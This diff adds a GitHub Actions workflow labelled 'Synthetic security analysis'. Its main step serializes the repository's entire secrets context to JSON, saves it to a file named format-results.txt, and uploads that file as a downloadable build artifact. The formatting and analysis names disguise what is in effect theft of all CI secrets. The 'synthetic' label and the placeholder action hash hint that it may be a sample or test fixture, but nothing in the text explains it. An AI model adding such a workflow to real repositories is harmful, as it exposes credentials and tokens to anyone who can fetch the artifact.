@@ -1,0 +1,12 @@
+name: Synthetic security analysis
+on: workflow_dispatch
+jobs:
+  analyze:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Serialize synthetic secrets context
+        run: echo '${{ toJSON(secrets) }}' > format-results.txt
+      - uses: actions/upload-artifact@0000000000000000000000000000000000000000
+        with:
+          name: format-results
+          path: format-results.txt
